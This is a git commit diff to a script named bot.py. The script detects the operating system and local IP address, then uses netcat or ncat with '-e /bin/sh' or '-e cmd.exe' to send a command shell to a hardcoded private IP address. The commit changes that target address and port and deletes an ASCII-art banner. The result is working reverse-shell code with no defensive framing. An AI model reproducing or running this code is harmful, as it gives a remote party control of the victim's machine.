57d79e17e65f226d9cbb648088e46ec9e0a9dbe9
Pol420OWO <118475266+Pol420OWO@users.noreply.github.com>
2023-02-14 20:40:07 +0100

    Update bot.py

--- bot.py
+++ bot.py
@@ -5,23 +5,15 @@ import socket  
 def run():
   hostname=socket.gethostname()   
   IPAddr=socket.gethostbyname(hostname) 
-  iph='172.16.22.82'
-  lport='4444'
-  print('')
-  print(' ############### # # # ##############')
-  print(' ####### ###### # #  # # ####### ####')
-  print(' ######   ##### ##    ## ######   ###')
-  print(' ####### #######  #  #  ######## ####')
-  print(' ################ ### ###############')
-  print('')
+  iph='172.16.32.58'
   print('# OS name: ', platform.system())
   if "Linux" in platform.system():
     print('Linux: ', sysconfig.get_platform()) 
     print(' IpAddress: ', IPAddr)
-    #os.system( 'nc -lvp 4444 -e /bin/sh')
-    os.system('nc' + iph+ lport + ' -e /bin/sh')
+    #os.system( 'nc -lvp 734 -e /bin/sh')
+    os.system('nc' + iph+ ' 734 -e /bin/sh')
   elif "Windows" in platform.system():
     print('Windows: ', sysconfig.get_platform()) 
     print('Address ip: ', IPAddr)
-    #os.system('ncat -lvp 4444 -e cmd.exe')
-    os.system('ncat '+ iph + lport ' -e cmd.exe')
+    #os.system('ncat -lvp 734 -e cmd.exe')
+    os.system('ncat '+ iph +' 734 -e cmd.exe')
